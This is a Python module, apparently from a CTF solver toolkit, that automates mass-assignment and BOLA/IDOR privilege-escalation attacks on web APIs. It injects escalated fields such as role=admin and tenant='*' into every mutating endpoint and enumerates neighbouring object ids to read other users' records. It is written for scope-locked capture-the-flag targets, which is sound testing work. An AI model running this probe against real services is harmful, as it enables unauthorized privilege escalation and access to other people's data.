#!/usr/bin/env python3
"""Live mass-assignment / BOLA / OpenAPI privilege-escalation probe (B-020).

One engine for the authorization-escalation family that was rebuilt per CSCTF
challenge (scope/role/tenant/tier mass-assignment, BOLA, embedded-catalog IDOR):

  1. INGEST a service description -- ``/openapi.json`` or ``/schema`` (OpenAPI 3.x
     or Swagger 2.0 JSON) -- to learn mutating operations, their writable body
     fields, privileged export endpoints and object-keyed routes. No code is run
     and no ``$ref`` outside the document is followed.
  2. LOG IN with caller-supplied credentials so the scope-locked client carries
     the authenticated session, and read the authenticated identity as a BASELINE
     (role/tier/owner) plus the baseline access status of each privileged export.
  3. MASS-ASSIGN: for every mutating operation (POST/PUT/PATCH) and configured
     export endpoint, send the documented body PLUS injected privilege fields
     (role, scope, tenant, tier, is_admin, ...) set to escalated values, then
     RE-READ the identity and the privileged endpoints and flag a response as
     privilege-escalating ONLY when the injected authority actually took effect
     (the authoritative identity now reports the escalated value, or an export
     that denied the baseline session now returns it).
  4. AUTO-DEREF object routes: read the session's own object to learn its id and
     owner, then dereference neighbour ids (via ``object_refs``) and flag a BOLA
     when a neighbour object belonging to another owner/tenant is returned.

Every finding is grounded in an observed before/after difference, never in the
mere fact that a field was sent. The client never leaves the one scope-locked
target; this module opens no socket of its own and never auto-submits: a
recovered flag is RETURNED for the player to submit through ctf.submit.

Public API:

``probe(target, ctx=None)``
    Run the probe against one target. ``target`` is a URL or a dict carrying
    ``url``. ``ctx`` may provide an injected scope-locked ``client``, ``login``
    credentials, an ``identity`` read spec, ``privileged`` export paths,
    ``assign_targets``, ``own_ids`` for object routes, request/byte/deadline
    budgets, a threading ``stop`` event, and ``preloaded`` pages for offline
    regression. Returns a JSON-friendly result dict (never a SolverResult: the
    web lane wraps it).

Import-only (``library``): ``ctf run`` refuses it; the web lane calls ``probe``.
"""

from __future__ import annotations

import json
import re
import time
import urllib.parse
from pathlib import Path

# The live HTTP client (scope-locked) and the event flag reader live in the web toolkit.
try:  # package import
    from ..toolkits import web as _web  # type: ignore
except Exception:  # pragma: no cover - exercised by direct solver-directory import
    _web = None
if _web is None:
    try:
        import importlib.util as _ilu

        _spec = _ilu.spec_from_file_location(
            "_privesc_web", Path(__file__).resolve().parents[1] / "toolkits" / "web.py")
        _web = _ilu.module_from_spec(_spec)  # type: ignore[assignment]
        _spec.loader.exec_module(_web)  # type: ignore[union-attr]
    except Exception:  # pragma: no cover - a broken checkout fails loudly below
        _web = None

# Neighbour-id generation for object-route dereference (offline, bounded).
try:
    from . import object_refs as _object_refs  # type: ignore
except Exception:  # pragma: no cover - direct solver-directory import
    try:
        import object_refs as _object_refs  # type: ignore
    except Exception:  # pragma: no cover
        _object_refs = None


DEFAULT_MAX_REQUESTS = 48
DEFAULT_MAX_BYTES = 8 * 1024 * 1024
DEADLINE_PAD = 0.2
REQUEST_TIMEOUT = 10.0
MAX_SCHEMA_BYTES = 4 * 1024 * 1024
MAX_JSON_DEPTH = 40
MAX_OPERATIONS = 512
MAX_FIELDS = 64

# Candidate service-description locations, tried in order until one parses.
SCHEMA_PATHS = ("/openapi.json", "/schema", "/api/schema", "/swagger.json",
                "/openapi.yaml", "/v3/api-docs", "/api/openapi.json")

_METHODS = ("get", "post", "put", "patch", "delete")
_MUTATING = ("post", "put", "patch")

# Authority fields a mass-assignment tries to smuggle into a writable DTO, and the escalated value
# each is set to. The keys are matched case-insensitively against schema field names too.
ESCALATE_VALUES: dict[str, object] = {
    "role": "admin",
    "roles": ["admin"],
    "is_admin": True,
    "isadmin": True,
    "admin": True,
    "is_staff": True,
    "is_superuser": True,
    "superuser": True,
    "scope": "admin",
    "scopes": ["admin"],
    "permissions": ["admin"],
    "privilege": "admin",
    "privileges": ["admin"],
    "access_level": "admin",
    "accesslevel": "admin",
    "level": "admin",
    "group": "admin",
    "groups": ["admin"],
    "account_type": "admin",
    "accounttype": "admin",
    "tier": "enterprise",
    "plan": "enterprise",
    "subscription": "enterprise",
    "tenant": "*",
    "tenant_id": "*",
    "tenantid": "*",
    "org": "*",
    "org_id": "*",
    "verified": True,
    "approved": True,
    "status": "active",
}
# Field names we treat as authority markers wherever they appear (superset of the keys above).
PRIVILEGE_FIELDS = frozenset(ESCALATE_VALUES)
# Identity values that count as "escalated" relative to an ordinary account.
_ESCALATED_TOKENS = frozenset({"admin", "administrator", "superuser", "super_user", "root",
                               "owner", "staff", "enterprise", "premium", "gold", "*", True})

_PRIVILEGED_PATH = re.compile(r"(?i)(?:^|/)(?:admin|administration|manage|management|internal|ops|"
                              r"export|exports|reports?|billing|invoices?|audit|backup|all)(?:/|$|s\b)")
_OBJECT_PARAM = re.compile(r"\{([^{}/]*(?:id|uuid|key|slug|account|user|tenant|order|invoice|"
                           r"ref|number|no)[^{}/]*)\}", re.I)
_INT_SEGMENT = re.compile(r"^\d{1,18}$")


class PrivescProbeError(ValueError):
    """Malformed probe input or over-limit service description."""


# --------------------------------------------------------------------------------------
# Bounded OpenAPI / Swagger ingestion (JSON only; no code, no external refs).
# --------------------------------------------------------------------------------------

def _bounded_load(raw) -> object | None:
    """json.loads with a byte cap; returns None for anything that is not JSON."""
    if isinstance(raw, (bytes, bytearray, memoryview)):
        data = bytes(raw)
        if len(data) > MAX_SCHEMA_BYTES:
            raise PrivescProbeError(f"service description exceeds {MAX_SCHEMA_BYTES} bytes")
        text = data.decode("utf-8", "replace")
    elif isinstance(raw, str):
        if len(raw) > MAX_SCHEMA_BYTES:
            raise PrivescProbeError(f"service description exceeds {MAX_SCHEMA_BYTES} bytes")
        text = raw
    else:
        return None
    text = text.strip()
    if not text or text[0] not in "{[":
        return None
    try:
        return json.loads(text)
    except (ValueError, RecursionError):
        return None


def _resolve_ref(spec: dict, node: object, _depth: int = 0) -> object:
    """Resolve a single local ``$ref`` (``#/...``) once; external refs are never followed."""
    if _depth > MAX_JSON_DEPTH or not isinstance(node, dict):
        return node
    ref = node.get("$ref")
    if not isinstance(ref, str) or not ref.startswith("#/"):
        return node
    target: object = spec
    for part in ref[2:].split("/"):
        part = part.replace("~1", "/").replace("~0", "~")
        if isinstance(target, dict) and part in target:
            target = target[part]
        else:
            return {}
    return _resolve_ref(spec, target, _depth + 1)


def _schema_field_names(spec: dict, schema: object, _depth: int = 0) -> list[str]:
    """Writable property names of a (possibly $ref/composed) request-body schema."""
    if _depth > MAX_JSON_DEPTH:
        return []
    schema = _resolve_ref(spec, schema, _depth)
    if not isinstance(schema, dict):
        return []
    names: list[str] = []
    props = schema.get("properties")
    if isinstance(props, dict):
        for name, sub in props.items():
            if not isinstance(name, str):
                continue
            sub = _resolve_ref(spec, sub, _depth + 1) if isinstance(sub, dict) else sub
            if isinstance(sub, dict) and sub.get("readOnly") is True:
                continue
            names.append(name)
    for key in ("allOf", "anyOf", "oneOf"):
        parts = schema.get(key)
        if isinstance(parts, list):
            for part in parts:
                names.extend(_schema_field_names(spec, part, _depth + 1))
    # Deduplicate, keep order, bound.
    seen: dict[str, None] = {}
    for name in names:
        if name not in seen:
            seen[name] = None
        if len(seen) >= MAX_FIELDS:
            break
    return list(seen)


def _request_body_fields(spec: dict, operation: dict) -> list[str]:
    body = operation.get("requestBody")
    body = _resolve_ref(spec, body) if isinstance(body, dict) else body
    fields: list[str] = []
    if isinstance(body, dict):
        content = body.get("content")
        if isinstance(content, dict):
            for media in content.values():
                if isinstance(media, dict):
                    fields.extend(_schema_field_names(spec, media.get("schema")))
    # Swagger 2.0 body parameter.
    for param in operation.get("parameters", []) or []:
        param = _resolve_ref(spec, param) if isinstance(param, dict) else param
        if isinstance(param, dict) and param.get("in") == "body":
            fields.extend(_schema_field_names(spec, param.get("schema")))
    out: dict[str, None] = {}
    for name in fields:
        out.setdefault(name, None)
    return list(out)[:MAX_FIELDS]


def extract_operations(raw) -> list[dict]:
    """Extract operations from an OpenAPI 3.x / Swagger 2.0 JSON document.

    Returns a list of ``{path, method, body_fields, path_params, mutating}`` dicts.
    Deserialization is bounded and never resolves an external reference.
    """
    spec = _bounded_load(raw)
    if not isinstance(spec, dict):
        return []
    paths = spec.get("paths")
    if not isinstance(paths, dict):
        return []
    operations: list[dict] = []
    for path, item in paths.items():
        if not isinstance(path, str) or not isinstance(item, dict):
            continue
        item = _resolve_ref(spec, item)
        if not isinstance(item, dict):
            continue
        path_params = [m.group(1) for m in _OBJECT_PARAM.finditer(path)]
        for method in _METHODS:
            operation = item.get(method)
            if not isinstance(operation, dict):
                continue
            operations.append({
                "path": path,
                "method": method.upper(),
                "body_fields": _request_body_fields(spec, operation) if method in _MUTATING else [],
                "path_params": list(path_params),
                "mutating": method in _MUTATING,
            })
            if len(operations) >= MAX_OPERATIONS:
                return operations
    return operations


def _is_privileged_path(path: str) -> bool:
    return bool(_PRIVILEGED_PATH.search(path or ""))


def _escalated(value: object) -> bool:
    if isinstance(value, bool):
        return value is True
    if isinstance(value, str):
        return value.strip().casefold() in _ESCALATED_TOKENS
    if isinstance(value, (list, tuple)):
        return any(_escalated(v) for v in value)
    return False


# --------------------------------------------------------------------------------------
# The live probe.
# --------------------------------------------------------------------------------------

def _origin(url: object) -> tuple | None:
    if not isinstance(url, str):
        return None
    try:
        parts = urllib.parse.urlsplit(url)
    except ValueError:
        return None
    if not parts.scheme or not parts.hostname:
        return None
    port = parts.port or (443 if parts.scheme == "https" else 80)
    return (parts.scheme.lower(), parts.hostname.lower(), port)


class _Probe:
    def __init__(self, target, ctx):
        ctx = ctx or {}
        if isinstance(target, dict):
            base_url = target.get("url") or target.get("base")
        else:
            base_url = target
        if not isinstance(base_url, str) or not base_url:
            raise PrivescProbeError("target must be a URL or a dict carrying 'url'")
        self.base_url = base_url
        self.ctx = ctx
        self.requests = 0
        self.bytes = 0
        self.stopped = None
        self.stop = ctx.get("stop")
        self.errors: list[str] = []
        self.flags: list[str] = []
        self.log: list[dict] = []
        try:
            self.max_requests = max(0, int(ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        try:
            self.max_bytes = max(0, int(ctx.get("max_bytes", DEFAULT_MAX_BYTES)))
        except (TypeError, ValueError):
            self.max_bytes = DEFAULT_MAX_BYTES
        self.deadline = ctx.get("deadline")
        self.preloaded = {}
        pre = ctx.get("preloaded")
        if isinstance(pre, dict):
            for key, page in pre.items():
                if isinstance(page, dict) and isinstance(key, str):
                    self.preloaded[key] = page
        client = ctx.get("client")
        if client is not None:
            if _origin(getattr(client, "base", None)) == _origin(base_url):
                self.client = client
            else:
                self.client = None
                self.stopped = "client_scope_mismatch"
        elif _web is not None:
            try:
                self.client = _web.WebClient(base_url, timeout=REQUEST_TIMEOUT)
            except Exception as exc:
                self.client = None
                self.stopped = "no_client:" + type(exc).__name__
                self.errors.append(f"client: {exc}")
        else:
            self.client = None
            self.stopped = "no_client"

    # -- budget -------------------------------------------------------------------------
    def _left(self):
        return None if self.deadline is None else self.deadline - time.time()

    def may_send(self):
        try:
            if self.stop is not None and self.stop.is_set():
                self.stopped = self.stopped or "stopped"
                return False
        except Exception:
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.bytes >= self.max_bytes:
            self.stopped = self.stopped or "max_bytes"
            return False
        left = self._left()
        if left is not None and left <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return self.client is not None

    def _scan_flags(self, body) -> list[str]:
        if not body or _web is None:
            return []
        try:
            found = sorted(_web.find_flags(body))
        except Exception:
            return []
        for flag in found:
            if flag not in self.flags:
                self.flags.append(flag)
        return found

    def send(self, method, path, *, json_body=None, data=None, headers=None):
        """One request, budgeted and logged. Returns a response dict or None."""
        if path in self.preloaded:
            page = self.preloaded[path]
            self._scan_flags(page.get("body"))
            return page
        if not isinstance(path, str) or not path.startswith("/") or path.startswith("//"):
            self.errors.append(f"unsafe path refused: {str(path)[:120]!r}")
            return None
        if not self.may_send():
            return None
        send_headers = dict(headers or {})
        body = data
        if json_body is not None:
            try:
                body = json.dumps(json_body)
            except (TypeError, ValueError) as exc:
                self.errors.append(f"body encode failed for {path}: {exc}")
                return None
            send_headers.setdefault("Content-Type", "application/json")
        self.requests += 1
        try:
            resp = self.client.request(method.upper(), path, data=body,
                                       headers=send_headers, allow_redirects=False)
        except Exception as exc:  # VPNRequired, OutOfScope, framing errors: recorded, never crash the probe.
            self.errors.append(f"{method} {path}: {type(exc).__name__}: {exc}")
            return None
        if isinstance(resp, dict):
            rbody = resp.get("body")
            if isinstance(rbody, (bytes, bytearray)):
                self.bytes += len(rbody)
            elif isinstance(rbody, str):
                self.bytes += len(rbody.encode("utf-8", "replace"))
            self._scan_flags(rbody)
            self.log.append({"method": method.upper(), "path": path,
                             "status": resp.get("status")})
        return resp

    @staticmethod
    def _json(resp) -> object | None:
        if not isinstance(resp, dict):
            return None
        body = resp.get("body")
        if isinstance(body, (bytes, bytearray)):
            body = bytes(body).decode("utf-8", "replace")
        if not isinstance(body, str):
            return None
        body = body.strip()
        if not body or body[0] not in "{[":
            return None
        try:
            return json.loads(body)
        except ValueError:
            return None

    @staticmethod
    def _status(resp) -> int | None:
        return resp.get("status") if isinstance(resp, dict) else None


def _dig(obj, field):
    """Case-insensitive lookup of ``field`` anywhere in a shallow JSON object/list."""
    target = field.casefold()
    if isinstance(obj, dict):
        for key, value in obj.items():
            if isinstance(key, str) and key.casefold() == target:
                return value
        for value in obj.values():
            found = _dig(value, field)
            if found is not None:
                return found
    elif isinstance(obj, list):
        for value in obj:
            found = _dig(value, field)
            if found is not None:
                return found
    return None


def _neighbor_ids(current: str, cap: int = 4, errors: list | None = None) -> list[str]:
    """Neighbour object references for ``current`` (ints and uuid1 via object_refs).

    If the uuid1 helper is present but raises, the failure is recorded as a named
    reason in ``errors`` (when supplied) rather than swallowed -- the BOLA phase
    must degrade loudly, never leave neighbours silently empty (rule 6).
    """
    out: list[str] = []
    if _INT_SEGMENT.match(current):
        base = int(current)
        for delta in (1, -1, 2, -2):
            nid = base + delta
            if nid >= 0:
                out.append(str(nid))
    elif _object_refs is not None:
        try:
            uuid_rows = _object_refs.uuid1_neighborhood(anchor=current, before=cap // 2,
                                                        after=cap - cap // 2)
            out.extend(str(row.get("reference")) for row in uuid_rows
                       if isinstance(row, dict) and row.get("reference"))
        except Exception as exc:
            if errors is not None:
                msg = f"object_refs failed: {exc}"
                if msg not in errors:
                    errors.append(msg)
    deduped: list[str] = []
    for nid in out:
        if nid and nid != current and nid not in deduped:
            deduped.append(nid)
        if len(deduped) >= cap:
            break
    return deduped


def probe(target, ctx=None) -> dict:
    """Run the live privilege-escalation probe. See the module docstring for ``ctx`` keys."""
    pr = _Probe(target, ctx)
    ctx = pr.ctx
    result: dict = {
        "base": pr.base_url,
        "stopped": pr.stopped,
        "login": None,
        "baseline": {},
        "operations": [],
        "object_routes": [],
        "findings": [],
        "escalations": [],
        "flag": None,
        "flags": [],
        "requests": 0,
        "errors": pr.errors,
    }
    if pr.client is None:
        result["stopped"] = pr.stopped or "no_client"
        result["requests"] = pr.requests
        result["flags"] = list(pr.flags)
        result["flag"] = pr.flags[0] if pr.flags else None
        return result

    findings: list[dict] = []

    def finding(fid, family, title, severity, confidence, confirmed, evidence):
        row = {"id": fid, "family": family, "title": title, "severity": severity,
               "confidence": confidence, "confirmed": bool(confirmed),
               "evidence": [str(e) for e in evidence]}
        findings.append(row)
        return row

    # 1. LOGIN -------------------------------------------------------------------------
    login = ctx.get("login")
    if isinstance(login, dict) and login.get("path"):
        method = str(login.get("method", "POST")).upper()
        data = login.get("data")
        content_type = login.get("content_type", "application/json")
        if content_type == "application/json":
            resp = pr.send(method, login["path"], json_body=data)
        else:
            if isinstance(data, dict):
                data = urllib.parse.urlencode(data)
            resp = pr.send(method, login["path"], data=data,
                           headers={"Content-Type": content_type})
        status = pr._status(resp)
        result["login"] = {"path": login["path"], "status": status,
                           "ok": status is not None and 200 <= status < 400}

    # 2. BASELINE IDENTITY + PRIVILEGED ENDPOINTS --------------------------------------
    identity_spec = ctx.get("identity") if isinstance(ctx.get("identity"), dict) else {}
    id_path = identity_spec.get("path")
    role_field = identity_spec.get("role_field", "role")
    owner_field = identity_spec.get("owner_field", "owner")
    tracked_fields = list(dict.fromkeys(
        [role_field] + list(identity_spec.get("fields", []) or [])
        + ["role", "tier", "scope", "plan", "is_admin", "account_type"]))

    def read_identity():
        if not id_path:
            return None
        resp = pr.send("GET", id_path)
        body = pr._json(resp)
        if not isinstance(body, (dict, list)):
            return None
        return {f: _dig(body, f) for f in tracked_fields}

    baseline_identity = read_identity()
    if baseline_identity is not None:
        result["baseline"]["identity"] = baseline_identity

    # Operations from the service description, then privileged export endpoints.
    schema_raw = None
    schema_src = None
    schema_paths = []
    if isinstance(ctx.get("schema_path"), str):
        schema_paths.append(ctx["schema_path"])
    schema_paths.extend(p for p in SCHEMA_PATHS if p not in schema_paths)
    for cand in schema_paths:
        resp = pr.send("GET", cand)
        if pr._status(resp) == 200:
            body = resp.get("body") if isinstance(resp, dict) else None
            ops_try = extract_operations(body)
            if ops_try:
                schema_raw, schema_src = body, cand
                break
    operations = extract_operations(schema_raw) if schema_raw is not None else []
    result["schema"] = schema_src
    result["operations"] = operations

    # Privileged endpoints: configured, plus GET exports discovered in the schema.
    privileged: list[str] = []
    for p in ctx.get("privileged", []) or []:
        if isinstance(p, str) and p.startswith("/") and p not in privileged:
            privileged.append(p)
    for op in operations:
        if op["method"] == "GET" and not op["path_params"] and _is_privileged_path(op["path"]) \
                and op["path"] not in privileged:
            privileged.append(op["path"])

    baseline_access: dict[str, int | None] = {}
    for path in privileged:
        baseline_access[path] = pr._status(pr.send("GET", path))
    if baseline_access:
        result["baseline"]["privileged_access"] = dict(baseline_access)
    # Working copy: the flip detector updates this as endpoints unlock, leaving the record above.
    current_access = dict(baseline_access)

    # 3. MASS-ASSIGNMENT ---------------------------------------------------------------
    def privilege_payload(fields):
        """Documented writable fields (inert placeholders) plus injected authority fields."""
        payload: dict[str, object] = {}
        injected: dict[str, object] = {}
        for name in fields or []:
            if not isinstance(name, str):
                continue
            key = name.casefold()
            if key in ESCALATE_VALUES:
                payload[name] = ESCALATE_VALUES[key]
                injected[name] = ESCALATE_VALUES[key]
            else:
                payload[name] = "R5D_INERT"
        for key, value in ESCALATE_VALUES.items():
            if key not in {k.casefold() for k in payload}:
                payload[key] = value
                injected[key] = value
        return payload, injected

    assign_targets = []
    for op in operations:
        if op["mutating"]:
            assign_targets.append((op["method"], op["path"], op["body_fields"]))
    for extra in ctx.get("assign_targets", []) or []:
        if isinstance(extra, dict) and extra.get("path"):
            assign_targets.append((str(extra.get("method", "PATCH")).upper(),
                                   extra["path"], extra.get("fields", [])))
        elif isinstance(extra, str):
            assign_targets.append(("PATCH", extra, []))

    seen_targets = set()
    for method, path, fields in assign_targets:
        if _OBJECT_PARAM.search(path):  # object-keyed routes are the BOLA phase's job
            continue
        key = (method, path)
        if key in seen_targets:
            continue
        seen_targets.add(key)
        payload, injected = privilege_payload(fields)
        resp = pr.send(method, path, json_body=payload)
        status = pr._status(resp)
        if status is None:
            continue
        # Re-read identity and re-probe privileged endpoints to see if authority changed.
        after_identity = read_identity()
        confirmed_fields: list[str] = []
        if baseline_identity is not None and after_identity is not None:
            for f in tracked_fields:
                before, now = baseline_identity.get(f), after_identity.get(f)
                if now != before and _escalated(now) and not _escalated(before):
                    confirmed_fields.append(f"{f}={now!r} (was {before!r})")
        flipped: list[str] = []
        for ppath, base_status in list(current_access.items()):
            if base_status is not None and base_status >= 400:
                after = pr.send("GET", ppath)
                after_status = pr._status(after)
                if after_status is not None and 200 <= after_status < 300:
                    flipped.append(f"{ppath}: {baseline_access[ppath]} -> {after_status}")
                    current_access[ppath] = after_status  # new reality for later targets
        if confirmed_fields or flipped:
            evidence = [f"mutating request: {method} {path}",
                        f"injected authority fields: {sorted(injected)!r}"]
            evidence += [f"identity now reports {c}" for c in confirmed_fields]
            evidence += [f"privileged endpoint unlocked {c}" for c in flipped]
            row = finding(
                f"mass-assign:{method}:{path}", "mass-assignment",
                "Mass-assigned authority field escalated the session", "high", "high", True, evidence)
            result["escalations"].append(row)
        elif injected and (fields and any(n.casefold() in PRIVILEGE_FIELDS for n in fields)):
            # The schema itself exposes a writable authority field; report as a lead.
            finding(f"mass-assign-lead:{method}:{path}", "mass-assignment",
                    "Writable authority field in body schema (unconfirmed)", "medium", "low", False,
                    [f"{method} {path}",
                     f"schema authority fields: {sorted(n for n in fields if n.casefold() in PRIVILEGE_FIELDS)!r}"])

    # 4. BOLA / IDOR AUTO-DEREF ---------------------------------------------------------
    own_ids = ctx.get("own_ids") if isinstance(ctx.get("own_ids"), dict) else {}
    object_routes = [op for op in operations
                     if op["method"] in ("GET", "PUT", "PATCH", "DELETE")
                     and _OBJECT_PARAM.search(op["path"])]
    # Caller-named object routes (template path with {id} and an own id).
    for extra in ctx.get("object_routes", []) or []:
        if isinstance(extra, dict) and extra.get("path"):
            object_routes.append({"path": extra["path"], "method": str(extra.get("method", "GET")).upper(),
                                  "path_params": [m.group(1) for m in _OBJECT_PARAM.finditer(extra["path"])],
                                  "body_fields": [], "mutating": False})
    result["object_routes"] = [{"method": o["method"], "path": o["path"]} for o in object_routes]

    seen_routes = set()
    for op in object_routes:
        if op["method"] != "GET":
            continue
        template = op["path"]
        if template in seen_routes:
            continue
        seen_routes.add(template)
        own = own_ids.get(template)
        if own is None and baseline_identity is not None:
            # Fall back to an id-looking value in the identity body.
            for f in ("id", "user_id", "account_id", "uid"):
                cand = _dig(result["baseline"].get("identity", {}), f)
                if cand is not None:
                    own = cand
                    break
        if own is None:
            continue
        own = str(own)
        own_path = _OBJECT_PARAM.sub(own, template, count=1)
        own_resp = pr.send("GET", own_path)
        if pr._status(own_resp) is None or pr._status(own_resp) >= 400:
            continue
        own_body = pr._json(own_resp)
        own_owner = _dig(own_body, owner_field) if own_body is not None else None
        if own_owner is None:
            own_owner = _dig(own_body, "tenant") if own_body is not None else None
        neighbors = _neighbor_ids(own, errors=pr.errors)
        if not neighbors and not _INT_SEGMENT.match(own) and _object_refs is None:
            # Non-integer (e.g. uuid1) own id, but the sibling-reference helper is
            # absent: the BOLA phase degrades. Surface a named reason, don't go silent.
            msg = f"object_refs unavailable: uuid neighbours skipped for {template}"
            if msg not in pr.errors:
                pr.errors.append(msg)
        for nid in neighbors:
            neigh_path = _OBJECT_PARAM.sub(nid, template, count=1)
            neigh = pr.send("GET", neigh_path)
            status = pr._status(neigh)
            if status is None or not (200 <= status < 300):
                continue
            neigh_body = pr._json(neigh)
            neigh_owner = _dig(neigh_body, owner_field) if neigh_body is not None else None
            if neigh_owner is None:
                neigh_owner = _dig(neigh_body, "tenant") if neigh_body is not None else None
            flag_here = bool(neigh_body is not None and pr._scan_flags(neigh.get("body")))
            cross_owner = (own_owner is not None and neigh_owner is not None
                           and neigh_owner != own_owner)
            if cross_owner or flag_here:
                evidence = [f"own object: GET {own_path} (owner={own_owner!r})",
                            f"neighbour object: GET {neigh_path} -> {status} (owner={neigh_owner!r})"]
                row = finding(f"bola:{template}", "BOLA",
                              "Object route returns another owner's object (BOLA/IDOR)",
                              "high", "high", True, evidence)
                result["escalations"].append(row)
                break

    # -- assemble ----------------------------------------------------------------------
    result["findings"] = findings
    result["requests"] = pr.requests
    result["stopped"] = pr.stopped or result["stopped"]
    result["flags"] = list(pr.flags)
    result["flag"] = pr.flags[0] if pr.flags else None
    result["log"] = pr.log
    return result


__all__ = ["probe", "extract_operations", "PrivescProbeError", "PRIVILEGE_FIELDS",
           "ESCALATE_VALUES", "SCHEMA_PATHS"]


if __name__ == "__main__":  # pragma: no cover - library engine; ctf run refuses it
    import sys
    print("privesc_probe is a library engine; call probe(target, ctx) from the web lane.",
          file=sys.stderr)
    sys.exit(2)
